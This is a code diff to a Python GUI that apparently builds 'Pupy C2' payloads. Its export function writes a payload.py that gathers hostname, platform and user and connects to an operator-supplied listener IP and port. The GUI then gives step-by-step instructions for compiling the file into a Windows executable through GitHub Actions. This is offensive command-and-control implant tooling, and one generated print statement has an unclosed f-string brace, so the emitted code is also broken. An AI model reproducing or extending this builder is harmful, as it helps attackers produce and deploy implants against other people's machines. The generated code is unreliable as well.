@@ -680,134 +680,114 @@ class BundlerTab(QWidget):
             QMessageBox.information(self, "Info", "Output directory doesn't exist yet")
 
     def export_for_github(self):
-        """Export payload.py to root for GitHub Actions compilation"""
+        """Export payload.py to root with correct listener configuration"""
         try:
-            # Find the latest binary created
-            output_dir = Path.home() / "Pupy_Outputs"
-            dist_dir = output_dir / "dist"
-
-            if not dist_dir.exists():
-                self.output_text.append("[!] No binaries found yet")
-                self.output_text.append("[!] Please click 'Bundle & Compile' first")
-                QMessageBox.warning(
-                    self,
-                    "Error",
-                    "No compiled binaries found.\n\n"
-                    "Please click 'Bundle & Compile' first",
-                )
-                return
-
-            # Find the payload.py source in the generated files
-            # Look for payload.py or similar Python source
-            payload_files = list(dist_dir.glob("payload*.py"))
-            source_files = list(dist_dir.glob("*.py"))
-
-            # Also check in the parent directory
-            if not source_files:
-                source_files = list(output_dir.glob("payload*.py"))
-
-            if not source_files:
-                # Try to find the original payload
-                payload_files = list(dist_dir.parent.glob("payload.py"))
-
-            # If still not found, create from the binary info
-            if not source_files and not payload_files:
-                self.output_text.append(
-                    "[*] No Python source found, extracting from binary..."
-                )
-
-                # Find any executable
-                exes = list(dist_dir.glob("*"))
-                if not exes:
-                    raise Exception("No executables found in dist/")
-
-                # Create a minimal payload.py at workspace root
-                payload_content = """#!/usr/bin/env python3
-\"\"\"
-Generated Payload for Windows Compilation
-This file is ready for GitHub Actions Windows compilation
-\"\"\"
-
-import subprocess
-import socket
-import time
-
-def main():
-    # Your payload code here
-    try:
-        # Example: Connect to listener
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("LISTENER_IP", LISTENER_PORT))
-        s.close()
-    except:
-        pass
-
-if __name__ == "__main__":
-    main()
+            # Get the CURRENT values from the app UI
+            listener_ip = self.listener_ip_input.text().strip()
+            listener_port = self.listener_port_spinbox.value()
+            
+            # Validate
+            if not listener_ip:
+                raise Exception("Listener IP is empty!")
+            if listener_port <= 0 or listener_port > 65535:
+                raise Exception(f"Invalid port: {listener_port}")
+            
+            self.output_text.append("[*] Creating payload with app configuration...")
+            self.output_text.append(f"[*] IP: {listener_ip}")
+            self.output_text.append(f"[*] Port: {listener_port}")
+            
+            # Create payload with CORRECT config from the app
+            payload_code = f'''#!/usr/bin/env python3
 """
-                workspace_root = Path.cwd()
-                payload_path = workspace_root / "payload.py"
-                payload_path.write_text(payload_content)
+Payload - Pupy C2
+Listener: {listener_ip}:{listener_port}
+"""
 
-                self.output_text.append(
-                    f"[+] Created minimal payload.py at {payload_path}"
-                )
-            else:
-                # Copy existing payload
-                source = source_files[0] if source_files else payload_files[0]
-                workspace_root = Path.cwd()
-                payload_path = workspace_root / "payload.py"
+import socket
+import platform
+import os
 
-                import shutil
+def get_system_info():
+    """Get system information"""
+    return {{
+        'hostname': platform.node(),
+        'platform': platform.system(),
+        'user': os.getenv('USER', 'unknown'),
+        'ip': '{listener_ip}',
+        'port': {listener_port}
+    }}
 
-                shutil.copy(str(source), str(payload_path))
+def connect_listener():
+    """Connect to listener"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('{listener_ip}', {listener_port}))
+        s.close()
+        return True
+    except:
+        return False
 
-                self.output_text.append(f"[+] Copied {source.name} → payload.py")
-
-            # Show instructions
-            self.output_text.append("\n" + "=" * 60)
-            self.output_text.append("📤 GITHUB ACTIONS EXPORT - NEXT STEPS")
-            self.output_text.append("=" * 60)
-            self.output_text.append(f"\n✅ File created: {Path.cwd() / 'payload.py'}")
-            self.output_text.append("\n📋 Next commands to run in Terminal:\n")
-            self.output_text.append("  # Initialize Git (if not done):")
-            self.output_text.append("  cd " + str(Path.cwd()))
-            self.output_text.append("  git init")
-            self.output_text.append("  git add .")
-            self.output_text.append("  git commit -m 'Initial commit'\n")
-            self.output_text.append(
-                "  # Add GitHub remote (create repo first on GitHub.com)"
-            )
-            self.output_text.append(
-                "  git remote add origin https://github.com/YOUR_USER/pupy-c2.git"
-            )
-            self.output_text.append("  git branch -M main")
-            self.output_text.append("  git push -u origin main\n")
-            self.output_text.append("  # Now to compile for Windows:")
-            self.output_text.append("  git add payload.py")
-            self.output_text.append("  git commit -m 'Windows payload - Level 5'")
-            self.output_text.append("  git push\n")
-            self.output_text.append("🚀 GitHub Actions will compile automatically!")
-            self.output_text.append("📊 Check: github.com/YOUR_USER/pupy-c2/actions\n")
-            self.output_text.append("⏱️  Wait 2-3 minutes for build to complete")
-            self.output_text.append("📥 Download artifact from Actions tab")
-            self.output_text.append("✅ You now have true Windows PE x64 binary!\n")
-            self.output_text.append("=" * 60)
+if __name__ == '__main__':
+    info = get_system_info()
+    print(f"[+] System Info: {{info}}")
+    if connect_listener():
+        print(f"[+] Connected to {{'{listener_ip}:{listener_port}'")
+    else:
+        print("[-] Connection failed")
+'''
+            
+            # Write to workspace root
+            workspace_root = Path.cwd()
+            payload_path = workspace_root / "payload.py"
+            payload_path.write_text(payload_code)
+            
+            self.output_text.append(f"\n✅ Payload created successfully!")
+            self.output_text.append(f"✅ Location: {payload_path}")
+            self.output_text.append(f"✅ IP: {listener_ip}")
+            self.output_text.append(f"✅ Port: {listener_port}")
+            
+            # Verify file
+            with open(payload_path, 'r') as f:
+                content = f.read()
+                if str(listener_ip) in content and str(listener_port) in content:
+                    self.output_text.append(f"\n✅ Payload verified - Config is CORRECT!")
+                else:
+                    self.output_text.append(f"\n⚠️  Warning: Config might not be in payload")
+            
+            self.output_text.append("\n" + "="*70)
+            self.output_text.append("📤 EXPORT COMPLETE - READY FOR GITHUB!")
+            self.output_text.append("="*70)
+            self.output_text.append(f"\nPayload Configuration:")
+            self.output_text.append(f"  Listener IP: {listener_ip}")
+            self.output_text.append(f"  Listener Port: {listener_port}")
+            self.output_text.append(f"\nNext Steps:")
+            self.output_text.append(f"  1. git add payload.py")
+            self.output_text.append(f"  2. git commit -m 'Payload {listener_ip}:{listener_port}'")
+            self.output_text.append(f"  3. git push")
+            self.output_text.append(f"\nGitHub Actions will compile to Windows PE x64!")
+            self.output_text.append("="*70)
 
             QMessageBox.information(
                 self,
-                "✅ Export Successful!",
-                "payload.py has been created at workspace root.\n\n"
-                "📋 Next steps:\n"
-                "1. Run: git add payload.py\n"
-                "2. Run: git commit -m 'Windows payload'\n"
-                "3. Run: git push\n\n"
-                "GitHub Actions will compile automatically!\n"
-                "Check your GitHub Actions tab for build status.",
+                "✅ Payload Exported!",
+                f"Payload created with correct configuration!\n\n"
+                f"Listener IP: {listener_ip}\n"
+                f"Listener Port: {listener_port}\n\n"
+                f"Next:\n"
+                f"1. git add payload.py\n"
+                f"2. git commit -m 'Payload'\n"
+                f"3. git push\n\n"
+                f"GitHub Actions compiles in 2-3 min!"
             )
 
         except Exception as e:
-            self.output_text.append(f"[!] Error: {str(e)}")
+            error_msg = str(e)
+            self.output_text.append(f"[!] ERROR: {error_msg}")
             QMessageBox.critical(
-                self, "Error", f"Failed to export payload:\n\n{str(e)}"
+                self,
+                "❌ Export Failed",
+                f"Error: {error_msg}\n\n"
+                f"Please check:\n"
+                f"- Listener IP is set\n"
+                f"- Port is valid (1-65535)"
             )
